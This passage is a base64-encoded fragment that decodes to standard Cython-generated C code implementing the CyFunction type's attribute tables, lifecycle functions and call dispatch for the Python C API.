vbnRleHQpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgcmV0dXJuIFB5T2JqZWN0X1NldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX21vZHVsZV9fIiwgdmFsdWUpOwp9CiNlbmRpZgpzdGF0aWMgUHlHZXRTZXREZWYgX19weXhfQ3lGdW5jdGlvbl9nZXRzZXRzW10gPSB7CiAgICB7ImZ1bmNfZG9jIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2MsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZG9jLCAwLCAwfSwKICAgIHsiX19kb2NfXyIsICAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MsIDAsIDB9LAogICAgeyJmdW5jX25hbWUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZSwgMCwgMH0sCiAgICB7Il9fbmFtZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X25hbWUsIDAsIDB9LAogICAgeyJfX3F1YWxuYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X3F1YWxuYW1lLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X3F1YWxuYW1lLCAwLCAwfSwKICAgIHsiZnVuY19kaWN0IiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0LCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RpY3QsIDAsIDB9LAogICAgeyJfX2RpY3RfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdCwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kaWN0LCAwLCAwfSwKICAgIHsiZnVuY19nbG9iYWxzIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9nbG9iYWxzLCAwLCAwLCAwfSwKICAgIHsiX19nbG9iYWxzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMsIDAsIDAsIDB9LAogICAgeyJmdW5jX2Nsb3N1cmUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Nsb3N1cmUsIDAsIDAsIDB9LAogICAgeyJfX2Nsb3N1cmVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY2xvc3VyZSwgMCwgMCwgMH0sCiAgICB7ImZ1bmNfY29kZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY29kZSwgMCwgMCwgMH0sCiAgICB7Il9fY29kZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9jb2RlLCAwLCAwLCAwfSwKICAgIHsiZnVuY19kZWZhdWx0cyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGVmYXVsdHMsIDAsIDB9LAogICAgeyJfX2RlZmF1bHRzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RlZmF1bHRzLCAwLCAwfSwKICAgIHsiX19rd2RlZmF1bHRzX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfa3dkZWZhdWx0cywgMCwgMH0sCiAgICB7Il9fYW5ub3RhdGlvbnNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMsIDAsIDB9LAogICAgeyJfaXNfY29yb3V0aW5lIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9pc19jb3JvdXRpbmUsIDAsIDAsIDB9LAojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgeyJfX21vZHVsZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9tb2R1bGUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbW9kdWxlLCAwLCAwfSwKI2VuZGlmCiAgICB7MCwgMCwgMCwgMCwgMH0KfTsKc3RhdGljIFB5TWVtYmVyRGVmIF9fcHl4X0N5RnVuY3Rpb25fbWVtYmVyc1tdID0gewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHsiX19tb2R1bGVfXyIsIFRfT0JKRUNULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV9tb2R1bGUpLCAwLCAwfSwKI2VuZGlmCiAgICB7Il9fZGljdG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoX19weXhfQ3lGdW5jdGlvbk9iamVjdCwgZnVuY19kaWN0KSwgUkVBRE9OTFksIDB9LAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHsiX192ZWN0b3JjYWxsb2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX3ZlY3RvcmNhbGwpLCBSRUFET05MWSwgMH0sCiNlbHNlCiAgICB7Il9fdmVjdG9yY2FsbG9mZnNldF9fIiwgVF9QWVNTSVpFVCwgb2Zmc2V0b2YoUHlDRnVuY3Rpb25PYmplY3QsIHZlY3RvcmNhbGwpLCBSRUFET05MWSwgMH0sCiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LAojZWxzZQogICAgeyJfX3dlYWtsaXN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgbV93ZWFrcmVmbGlzdCksIFJFQURPTkxZLCAwfSwKI2VuZGlmCiNlbmRpZgogICAgezAsIDAsIDAsICAwLCAwfQp9OwpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX3JlZHVjZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCBQeU9iamVjdCAqYXJncykKewogICAgUHlPYmplY3QgKnJlc3VsdCA9IE5VTEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihhcmdzKTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04obSk7CiAgICBQeV9JTkNSRUYobS0+ZnVuY19xdWFsbmFtZSk7CiAgICByZXN1bHQgPSBtLT5mdW5jX3F1YWxuYW1lOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X0N5RnVuY3Rpb25fbWV0aG9kc1tdID0gewogICAgeyJfX3JlZHVjZV9fIiwgKFB5Q0Z1bmN0aW9uKV9fUHl4X0N5RnVuY3Rpb25fcmVkdWNlLCBNRVRIX1ZBUkFSR1MsIDB9LAogICAgezAsIDAsIDAsIDB9Cn07CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChjeWZ1bmMpICgoY3lmdW5jKS0+ZnVuY193ZWFrcmVmbGlzdCkKI2Vsc2UKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KGN5ZnVuYykgKCgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fd2Vha3JlZmxpc3QpCiNlbmRpZgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlNZXRob2REZWYgKm1sLCBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNsb3N1cmUsIFB5T2JqZWN0ICptb2R1bGUsIFB5T2JqZWN0KiBnbG9iYWxzLCBQeU9iamVjdCogY29kZSkgewojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5Q0Z1bmN0aW9uT2JqZWN0ICpjZiA9IChQeUNGdW5jdGlvbk9iamVjdCopIG9wOwojZW5kaWYKICAgIGlmICh1bmxpa2VseShvcCA9PSBOVUxMKSkKICAgICAgICByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIG9wLT5mdW5jID0gUHlDRnVuY3Rpb25fTmV3RXgobWwsIChQeU9iamVjdCopb3AsIG1vZHVsZSk7CiAgICBpZiAodW5saWtlbHkoIW9wLT5mdW5jKSkgcmV0dXJuIE5VTEw7CiNlbmRpZgogICAgb3AtPmZsYWdzID0gZmxhZ3M7CiAgICBfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KG9wKSA9IE5VTEw7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgY2YtPm1fbWwgPSBtbDsKICAgIGNmLT5tX3NlbGYgPSAoUHlPYmplY3QgKikgb3A7CiNlbmRpZgogICAgUHlfWElOQ1JFRihjbG9zdXJlKTsKICAgIG9wLT5mdW5jX2Nsb3N1cmUgPSBjbG9zdXJlOwojaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X1hJTkNSRUYobW9kdWxlKTsKICAgIGNmLT5tX21vZHVsZSA9IG1vZHVsZTsKI2VuZGlmCiAgICBvcC0+ZnVuY19kaWN0ID0gTlVMTDsKICAgIG9wLT5mdW5jX25hbWUgPSBOVUxMOwogICAgUHlfSU5DUkVGKHF1YWxuYW1lKTsKICAgIG9wLT5mdW5jX3F1YWxuYW1lID0gcXVhbG5hbWU7CiAgICBvcC0+ZnVuY19kb2MgPSBOVUxMOwojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIG9wLT5mdW5jX2NsYXNzb2JqID0gTlVMTDsKI2Vsc2UKICAgICgoUHlDTWV0aG9kT2JqZWN0KilvcCktPm1tX2NsYXNzID0gTlVMTDsKI2VuZGlmCiAgICBvcC0+ZnVuY19nbG9iYWxzID0gZ2xvYmFsczsKICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19nbG9iYWxzKTsKICAgIFB5X1hJTkNSRUYoY29kZSk7CiAgICBvcC0+ZnVuY19jb2RlID0gY29kZTsKICAgIG9wLT5kZWZhdWx0cyA9IE5VTEw7CiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBOVUxMOwogICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IE5VTEw7CiAgICBvcC0+ZGVmYXVsdHNfZ2V0dGVyID0gTlVMTDsKICAgIG9wLT5mdW5jX2Fubm90YXRpb25zID0gTlVMTDsKICAgIG9wLT5mdW5jX2lzX2Nvcm91dGluZSA9IE5VTEw7CiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAogICAgc3dpdGNoIChtbC0+bWxfZmxhZ3MgJiAoTUVUSF9WQVJBUkdTIHwgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfTk9BUkdTIHwgTUVUSF9PIHwgTUVUSF9LRVlXT1JEUyB8IE1FVEhfTUVUSE9EKSkgewogICAgY2FzZSBNRVRIX05PQVJHUzoKICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTk9BUkdTOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX086CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX087CiAgICAgICAgYnJlYWs7CiAgICBjYXNlIE1FVEhfTUVUSE9EIHwgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFM6CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRDsKICAgICAgICBicmVhazsKICAgIGNhc2UgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFM6CiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTOgogICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IE5VTEw7CiAgICAgICAgYnJlYWs7CiAgICBkZWZhdWx0OgogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19TeXN0ZW1FcnJvciwgIkJhZCBjYWxsIGZsYWdzIGZvciBDeUZ1bmN0aW9uIik7CiAgICAgICAgUHlfREVDUkVGKG9wKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KI2VuZGlmCiAgICByZXR1cm4gKFB5T2JqZWN0ICopIG9wOwp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9jbGVhcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptKQp7CiAgICBQeV9DTEVBUihtLT5mdW5jX2Nsb3N1cmUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfQ0xFQVIobS0+ZnVuYyk7CiNlbHNlCiAgICBQeV9DTEVBUigoKFB5Q0Z1bmN0aW9uT2JqZWN0KiltKS0+bV9tb2R1bGUpOwojZW5kaWYKICAgIFB5X0NMRUFSKG0tPmZ1bmNfZGljdCk7CiAgICBQeV9DTEVBUihtLT5mdW5jX25hbWUpOwogICAgUHlfQ0xFQVIobS0+ZnVuY19xdWFsbmFtZSk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2RvYyk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2dsb2JhbHMpOwogICAgUHlfQ0xFQVIobS0+ZnVuY19jb2RlKTsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEKICAgIFB5X0NMRUFSKF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmoobSkpOwojZWxzZQogICAgewogICAgICAgIFB5T2JqZWN0ICpjbHMgPSAoUHlPYmplY3QqKSAoKFB5Q01ldGhvZE9iamVjdCAqKSAobSkpLT5tbV9jbGFzczsKICAgICAgICAoKFB5Q01ldGhvZE9iamVjdCAqKSAobSkpLT5tbV9jbGFzcyA9IE5VTEw7CiAgICAgICAgUHlfWERFQ1JFRihjbHMpOwogICAgfQojZW5kaWYKI2VuZGlmCiAgICBQeV9DTEVBUihtLT5kZWZhdWx0c190dXBsZSk7CiAgICBQeV9DTEVBUihtLT5kZWZhdWx0c19rd2RpY3QpOwogICAgUHlfQ0xFQVIobS0+ZnVuY19hbm5vdGF0aW9ucyk7CiAgICBQeV9DTEVBUihtLT5mdW5jX2lzX2Nvcm91dGluZSk7CiAgICBQeV9DTEVBUihtLT5kZWZhdWx0cyk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgdm9pZCBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pCnsKICAgIGlmIChfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KG0pICE9IE5VTEwpCiAgICAgICAgUHlPYmplY3RfQ2xlYXJXZWFrUmVmcygoUHlPYmplY3QgKikgbSk7CiAgICBfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyKG0pOwogICAgX19QeXhfUHlIZWFwVHlwZU9iamVjdF9HQ19EZWwobSk7Cn0Kc3RhdGljIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pCnsKICAgIFB5T2JqZWN0X0dDX1VuVHJhY2sobSk7CiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKG0pOwp9CnN0YXRpYyBpbnQgX19QeXhfQ3lGdW5jdGlvbl90cmF2ZXJzZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykKewogICAgewogICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopbSwgMSwgdmlzaXQsIGFyZyk7CiAgICAgICAgaWYgKGUpIHJldHVybiBlOwogICAgfQogICAgUHlfVklTSVQobS0+ZnVuY19jbG9zdXJlKTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5X1ZJU0lUKG0tPmZ1bmMpOwojZWxzZQogICAgUHlfVklTSVQoKChQeUNGdW5jdGlvbk9iamVjdCopbSktPm1fbW9kdWxlKTsKI2VuZGlmCiAgICBQeV9WSVNJVChtLT5mdW5jX2RpY3QpOwogICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19uYW1lKTsKICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bmNfcXVhbG5hbWUpOwogICAgUHlfVklTSVQobS0+ZnVuY19kb2MpOwogICAgUHlfVklTSVQobS0+ZnVuY19nbG9iYWxzKTsKICAgIF9fUHl4X1ZJU0lUX0NPTlNUKG0tPmZ1bmNfY29kZSk7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlfVklTSVQoX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihtKSk7CiNlbmRpZgogICAgUHlfVklTSVQobS0+ZGVmYXVsdHNfdHVwbGUpOwogICAgUHlfVklTSVQobS0+ZGVmYXVsdHNfa3dkaWN0KTsKICAgIFB5X1ZJU0lUKG0tPmZ1bmNfaXNfY29yb3V0aW5lKTsKICAgIFB5X1ZJU0lUKG0tPmRlZmF1bHRzKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCoKX19QeXhfQ3lGdW5jdGlvbl9yZXByKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKQp7CiAgICBQeU9iamVjdCAqcmVwcjsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVwciA9IFB5VW5pY29kZV9Gcm9tRm9ybWF0KCI8Y3lmdW5jdGlvbiAlVSBhdCAlcD4iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wLT5mdW5jX3F1YWxuYW1lLCAodm9pZCAqKW9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVwcjsKfQpzdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0ICpmID0gKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYzsKICAgIFB5Q0Z1bmN0aW9uIG1ldGg7CiAgICBpbnQgZmxhZ3M7CiAgICBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZik7CiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDsKICAgIGZsYWdzID0gUHlDRnVuY3Rpb25fR2V0RmxhZ3MoZik7CiAgICBpZiAodW5saWtlbHkoZmxhZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBQeUNGdW5jdGlvbk9iamVjdCogZiA9IChQeUNGdW5jdGlvbk9iamVjdCopZnVuYzsKICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBmLT5tX21sLT5tbF9tZXRoOwogICAgaW50IGZsYWdzID0gZi0+bV9tbC0+bWxfZmxhZ3M7CiNlbmRpZgogICAgUHlfc3NpemVfdCBzaXplOwogICAgc3dpdGNoIChmbGFncyAmIChNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTIHwgTUVUSF9OT0FSR1MgfCBNRVRIX08pKSB7CiAgICBjYXNlIE1FVEhfVkFSQVJHUzoKICAgICAgICBpZiAobGlrZWx5KGt3ID09IE5VTEwgfHwgUHlEaWN0X1NpemUoa3cpID09IDApKQogICAgICAgICAgICByZXR1cm4gKCptZXRoKShzZWxmLCBhcmcpOwogICAgICAgIGJyZWFrOwogICAgY2FzZSBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTOgogICAgICAgIHJldHVybiAoKihQeUNGdW5jdGlvbldpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBhcmcsIGt3KTsKICAgIGNhc2UgTUVUSF9OT0FSR1M6CiAgICAgICAgaWYgKGxpa2VseShrdyA9PSBOVUxMIHx8IFB5RGljdF9TaXplKGt3KSA9PSAwKSkgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfR0VUX1NJWkUoYXJnKTsKI2Vsc2UKICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfU2l6ZShhcmcpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSA8IDApKSByZXR1cm4gTlVMTDsKI2VuZGlmCiAgICAgICAgICAgIGlmIChsaWtlbHkoc2l6ZSA9PSAwKSkKICAgICAgICAgICAgICAgIHJldHVybiAoKm1ldGgpKHNlbGYsIE5VTEwpOwogICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsCiAgICAgICAgICAgICAgICAidGFrZXMgbm8gYXJndW1lbnRzIiwgc2l6ZSk7CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICBicmVhazsKICAgIGNhc2UgTUVUSF9POgogICAgICAgIGlmIChsaWtlbHkoa3cgPT0gTlVMTCB8fCBQeURpY3RfU2l6ZShrdykgPT0gMCkpIHsKI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX0dFVF9TSVpFKGFyZyk7CiNlbHNlCiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX1NpemUoYXJnKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgPCAwKSkgcmV0dXJuIE5VTEw7CiNlbmRpZgogICAgICAgICAgICBpZiAobGlrZWx5KHNpemUgPT0gMSkpIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpyZXN1bHQsICphcmcwOwogICAgICAgICAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgICAgICAgICBhcmcwID0gUHlUdXBsZV9HRVRfSVRFTShhcmcsIDApOwogICAgICAgICAgICAgICAgI2Vsc2UKICAgICAgICAgICAgICAgIGFyZzAgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oYXJnLCAwKTsgaWYgKHVubGlrZWx5KCFhcmcwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIHJlc3VsdCA9ICgqbWV0aCkoc2VsZiwgYXJnMCk7CiAgICAgICAgICAgICAgICAjaWYgIShDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUykKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihhcmcwKTsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgICAgICAgICAgfQogICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKAogICAgICAgICAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsCiAgICAgICAgICAgICAgICAidGFrZXMgZXhhY3RseSBvbmUgYXJndW1lbnQiLCBzaXplKTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgZGVmYXVsdDoKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfU3lzdGVtRXJyb3IsICJCYWQgY2FsbCBmbGFncyBmb3IgQ3lGdW5jdGlvbiIpOwogICAgICAgIHJldHVybiBOVUxMOwogICAgfQogICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV90eXBlX2Vycm9yKAogICAgICAgIChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jLCAidGFrZXMgbm8ga2V5d29yZCBhcmd1bWVudHMiKTsKICAgIHJldHVybiBOVUxMOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX0NhbGwoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdykgewogICAgUHlPYmplY3QgKnNlbGYsICpyZXN1bHQ7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5mdW5jKTsKICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7CiNlbHNlCiAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopZnVuYyktPm1fc2VsZjsKI2VuZGlmCiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoZnVuYywgc2VsZiwgYXJnLCBrdyk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9DYWxsQXNNZXRob2QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmdzLCBQeU9iamVjdCAqa3cpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jOwojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKQogICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjID0gX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoY3lmdW5jKTsKICAgIGlmICh2YykgewojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgIHJldHVybiBfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0KGZ1bmMsIHZjLCAmUHlUdXBsZV9HRVRfSVRFTShhcmdzLCAwKSwgKHNpemVfdClQeVR1cGxlX0dFVF9TSVpFKGFyZ3MpLCBrdyk7CiNlbHNlCiAgICAgICAgKHZvaWQpICZfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0OwogICAgICAgIHJldHVybiBQeVZ